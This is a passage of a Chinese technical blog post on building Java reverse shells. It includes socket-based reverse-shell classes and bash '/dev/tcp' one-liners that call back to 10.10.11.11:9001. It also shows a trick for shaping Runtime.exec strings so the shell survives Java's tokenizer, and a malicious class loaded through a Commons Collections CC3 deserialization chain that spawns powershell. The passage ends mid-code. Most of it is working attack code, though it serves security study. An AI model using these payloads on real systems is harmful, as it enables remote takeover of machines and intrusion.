&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>也是可以成功反弹 shell</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250730174728842.png" srcset="/img/loading.gif" lazyload alt="image-20250730174728842" style="zoom:50%;" />
+
+<p>当然也可以去看 <a target="_blank" rel="noopener" href="https://forum.ywhack.com/reverse-shell/">反弹 shell 生成器</a> 生成的 payload，有的杀软会报毒，注意甄别。</p>
+<h2 id="linux-revShell"><a href="#linux-revShell" class="headerlink" title="linux revShell"></a>linux revShell</h2><p>当然 linux 也是可以使用 socket 进行 shell 的反弹的</p>
+<h3 id="socket-1"><a href="#socket-1" class="headerlink" title="socket"></a>socket</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaSocketRevShell</span>().conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250731101542221.png" srcset="/img/loading.gif" lazyload alt="image-20250731101542221" style="zoom:67%;" />
+
+<p>也可以成功反弹</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250731101510436.png" srcset="/img/loading.gif" lazyload alt="image-20250731101510436" style="zoom:50%;" />
+
+<h3 id="bash-命令"><a href="#bash-命令" class="headerlink" title="bash 命令"></a>bash 命令</h3><h4 id="cmdarray"><a href="#cmdarray" class="headerlink" title="cmdarray"></a>cmdarray</h4><p>其实和我们之前讲的如出一辙</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&#x27;</span> <br></code></pre></td></tr></table></figure>
+
+<p>对应的 java 代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String[] cmd = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<br>                <span class="hljs-string">&quot;bash&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</span><br>            &#125;;<br>            java.lang.Runtime.getRuntime().exec(cmd);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里要传入数组，不然在 StringTokenizer 的处理过程中，会把我们的 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.11.11&#x2F;9001 0 &gt;&amp;1 按照空格拆分，那显然不是我们想要的</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250731110033628.png" srcset="/img/loading.gif" lazyload alt="image-20250731110033628" style="zoom:50%;" /></blockquote>
+<p>kali 执行</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731105616577.png" srcset="/img/loading.gif" lazyload alt="image-20250731105616577"></p>
+<p>成功反弹</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731105403909.png" srcset="/img/loading.gif" lazyload alt="image-20250731105403909"></p>
+<h4 id="cmdString"><a href="#cmdString" class="headerlink" title="cmdString"></a>cmdString</h4><p>那我们可以基于 bash 和 StringTokenizer 的特性，构造一个可以反弹 shell 的字符串吗？</p>
+<p>我们先来看 bash -c 的帮助</p>
+<p>执行 man bash 可以看到 -c 的介绍</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-c     If the -c option is present, <span class="hljs-keyword">then</span> commands are <span class="hljs-built_in">read</span> from the first non-option argument command_string.  If there are argu‐ments after the command_string, the first argument is assigned to <span class="hljs-variable">$0</span> and any remaining arguments are assigned to the posi‐tional parameters.  The assignment to <span class="hljs-variable">$0</span> sets the name of the shell, <span class="hljs-built_in">which</span> is used <span class="hljs-keyword">in</span> warning and error messages.<br></code></pre></td></tr></table></figure>
+
+<p>翻译过来就是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">如果存在 -c 选项，则从第一个非选项参数 command_string 中读取命令。如果 command_string 之后有参数，则第一个参数被赋值给 <span class="hljs-variable">$0</span>，其余参数被赋值给位置参数。赋值给 <span class="hljs-variable">$0</span> 会设置 shell 的名称，该名称用于警告和错误消息中。<br></code></pre></td></tr></table></figure>
+
+<p><strong>例子</strong><br>简而言之就是 <code>bash -c String1 String2 String3 ...</code> -c 参数后边有多个字符串的话，bash 的处理是将 <strong>String1 识别为要执行的字符串</strong>，String2 赋值给 $0，String3赋值给$ 1 以此类推。</p>
+<p>在 bash 中有一个特殊的变量 <code>$@</code> 和 <code>$*</code> 它会扩展为所有的位置参数（<code>$1</code>, <code>$2</code>, <code>$3</code>, …）</p>
+<blockquote>
+<p>bash 执行命令的流程</p>
+<ol>
+<li><strong>词法分析（Parsing）</strong>: Shell 将你的命令行输入分解成一个个的“词”（tokens）。</li>
+<li><strong>I&#x2F;O 重定向扫描与处理 (Redirection)</strong>: 在进行任何变量扩展或命令执行之前，Shell 会从左到右扫描整个命令行，寻找重定向操作符（如 <code>&gt;</code>、<code>&lt;</code>、<code>&gt;&amp;</code>、<code>&gt;&gt;</code> 等）。</li>
+<li><strong>变量与参数扩展 (Expansion)</strong>: Shell 进行变量替换（<code>$VAR</code>）、参数扩展（<code>$@</code>）、命令替换（<code>$(command)</code>）等。</li>
+<li><strong>命令执行 (Execution)</strong>: 最后，Shell 执行命令。</li>
+</ol>
+</blockquote>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150007446.png" srcset="/img/loading.gif" lazyload alt="image-20250731150007446"></p>
+<p>看样子 <code>$@</code> 和 <code>$*</code> 是相同的，但是 <code>&quot;$@&quot;</code> , <code>&quot;$*&quot;</code> 还是有区别的</p>
+<p><code>&quot;$@&quot;</code> : 把 <code>$1</code> <code>$2</code> <code>$3</code> … 等，转化为单独字符串，就比如上边的 <code>&quot;bash&quot; &quot;-i&quot; &quot;&gt;&amp;&quot; &quot;/dev/tcp/10.10.11.11/9001&quot; &quot;0&gt;&amp;1&quot;</code> 每一个都是单独的字符串</p>
+<p><code>&quot;$*&quot;</code> : 把 <code>$1</code> <code>$2</code> <code>$3</code> … 等，转化为一整个字符串，就比如把上面的转化为 <code>&quot;bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</code> 分隔符为 IFS 变量的第一个字节（默认为空格）</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150825987.png" srcset="/img/loading.gif" lazyload alt="image-20250731150825987" style="zoom: 67%;" />
+
+<p>看到可以反弹成功</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731150902166.png" srcset="/img/loading.gif" lazyload alt="image-20250731150902166"></p>
+<p>利用这一特性 和 java Runtime#exec 的 StringTokenizer 分词特性，我们可以构造反弹 shell 命令</p>
+<h5 id="错误的-payload"><a href="#错误的-payload" class="headerlink" title="错误的 payload"></a>错误的 payload</h5><p>讲了这么多，你肯定是想直接这样写 payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-string">&quot;$*&quot;</span> 0 bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>分词处理</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250731151542469.png" srcset="/img/loading.gif" lazyload alt="image-20250731151542469" style="zoom:50%;" />
+
+<p>执行验证</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c \&quot;$*\&quot; 0 bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1&quot;</span>);<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">errorStream</span> <span class="hljs-operator">=</span> process.getErrorStream();<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">stdInput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(errorStream));<br>            String str;<br>            <span class="hljs-keyword">while</span> ((str=stdInput.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                System.out.println(str);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250731173825562.png" srcset="/img/loading.gif" lazyload alt="image-20250731173825562"></p>
+<p>很明显 他不能正确执行，看到报错信息他好像是吧 我们想要 -c 执行的命令字符串，当作可执行文件去执行了。为什么会这样呢？</p>
+<p>其实也很简单，我们先来了解 bash -c</p>
+<p><code>bash -c</code> 三步模型：解析，扩展&#x2F;填充，执行</p>
+<p>解析：查看命令行中的 特殊意义的字符 重定向：<code>&gt;</code> 填充字段：<code>$1</code> 等</p>
+<p>填充：就是识别后边字符串，赋值到 <code>$1</code> <code>$2</code> … 并以<span style="color:#FF0000;">普通字符串</span>填充到指定位置</p>
+<p>执行：如果是填充的，就会当作普通字符串处理，所以不会解析重定向字符，就反弹不了 shell</p>
+<p>看我们的报错信息 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1: No such file or directory</code> 这就不难理解了</p>
+<p>我们来分析一下这个流程</p>
+<p>java 的 StringTokenizer 分词后，识别到 <code>“$*”</code> 会把后续的 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1</code> 赋值给 <code>$1</code> 然后填充到 <code>$*</code> , <code>&quot;$*&quot;</code>，带了双引号， 把所有值当成一整个字符串，bash 把 <code>$1</code> 当成命令，后续的 <code>$2</code>… 都识别为命令参数，所以把这个参数当成命令或可执行文件了，没有 <code>$2</code> … 所以没有参数，就产生了我们看到的报错 <code>bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1: No such file or directory</code> </p>
+<h5 id="正确的-payload"><a href="#正确的-payload" class="headerlink" title="正确的 payload"></a>正确的 payload</h5><p>我们可以给 <code>$*</code> 或者 <code>$@</code> 后边加上管道符 <code>|</code> 把字符串放入标准输入 <code>stdin</code> 在重定向给 一个新的 bash </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c <span class="hljs-variable">$@</span>|bash 0 <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c $*|bash 0 <span class="hljs-built_in">echo</span> bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<p>java 的 StringTokenizer 分词器会把这个命令分为了 这些词</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250803173127171.png" srcset="/img/loading.gif" lazyload alt="image-20250803173127171" style="zoom:67%;" />
+
+<ol>
+<li><p>也就是会先传递 <code>bash</code> 字符串，开始 bash 会话</p>
+</li>
+<li><p>传递 <code>-c</code> 告诉当前 bash 执行后面的字符串</p>
+</li>
+<li><p>传递 <code>$@|bash</code> 这是会对 $@ 进行填充，且 <code>|</code> 管道符不是填充过来的，会被 bash 识别，生效 ，将流传给一个新的 bash</p>
+</li>
+<li><p><code>$@</code> 被依次填充为 <code>&quot;echo&quot;</code> <code>&quot;bash&quot;</code> <code>&quot;-i&quot;</code> <code>&quot;&gt;&amp;&quot;</code> <code>&quot;/dev/tcp/10.10.11.11/9001&quot;</code> <code>&quot;0&gt;&amp;1&quot;</code></p>
+</li>
+<li><p>echo 会被识别为 “bash -c” 的命令，后续的都是 echo 命令的参数，所以会输出为反弹没了的字符串</p>
+</li>
+<li><p>最后 通过管道传递给 新的 bash，从而执行命令</p>
+</li>
+</ol>
+<p>可以成功反弹 shell</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803181216335.png" srcset="/img/loading.gif" lazyload alt="image-20250803181216335"></p>
+<h2 id="与反序列化联合"><a href="#与反序列化联合" class="headerlink" title="与反序列化联合"></a>与反序列化联合</h2><p>这里举几个有代表性的例子就可以了，基本原理都是相同的，反序列主要分为类加载命令执行和反射命令执行</p>
+<h3 id="类加载（CC3-CC4）"><a href="#类加载（CC3-CC4）" class="headerlink" title="类加载（CC3&#x2F;CC4）"></a>类加载（CC3&#x2F;CC4）</h3><p>关键就是后边的两步</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span><span class="hljs-selector-class">.trax</span>.TrAXFilter<span class="hljs-selector-id">#TrAXFilter</span><br>                    		javax<span class="hljs-selector-class">.xml</span><span class="hljs-selector-class">.transform</span>.Templates#newTransformer<br></code></pre></td></tr></table></figure>
+
+<p>Templates#newTransformer 这个我们在学习 fastjson 的各种反序列化链的时候就非常熟悉了，他有定义类并实现类初始化的能力，也就是可以执行 static 静态代码块</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803193606078.png" srcset="/img/loading.gif" lazyload alt="image-20250803193606078"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250803193641122.png" srcset="/img/loading.gif" lazyload alt="image-20250803193641122"></p>
+<p>这里就不过多赘述了，直接看利用代码吧</p>
+<h4 id="CC3-相关代码"><a href="#CC3-相关代码" class="headerlink" title="CC3 相关代码"></a>CC3 相关代码</h4><p><strong>要加载的恶意类 JavaSocketRevShell</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaSocketRevShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pumpStream</span><span class="hljs-params">(InputStream in, OutputStream out)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> bytesRead;<br>                <span class="hljs-keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                    out.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    out.flush();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close();<br>                    out.close();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException ignored) &#123;&#125;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">conn</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, String... cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(host, port)) &#123;<br>            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">pb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmd);<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> pb.start();<br>            pumpStream(socket.getInputStream(), process.getOutputStream());<br>            pumpStream(process.getInputStream(), socket.getOutputStream());<br>            pumpStream(process.getErrorStream(), socket.getOutputStream());<br>            process.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn(<span class="hljs-string">&quot;10.10.11.11&quot;</span>, <span class="hljs-number">9001</span>, <span class="hljs-string">&quot;powershell.exe&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            &#125;<br>        &#125;).start();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：</p>
+<p>​	这里在 static 通过起一个新线程，从而避免了 JVM 在执行完静态代码以后，把我们的 powershell 管道（socket）资源回收。</p>
+<p>new Thread(() -&gt; {<br>            try {<br>                conn(“10.10.11.11”, 9001, “powershell.exe”);<br>            } catch (Exception e) {<br>            }<br>        }).start();</p>
+</blockquote>
+<p><strong>CC3 反序列化链</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassLoaderRevShell</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.get(<span class="hljs-string">&quot;com.lingx5.windows.JavaSocketRevShell&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 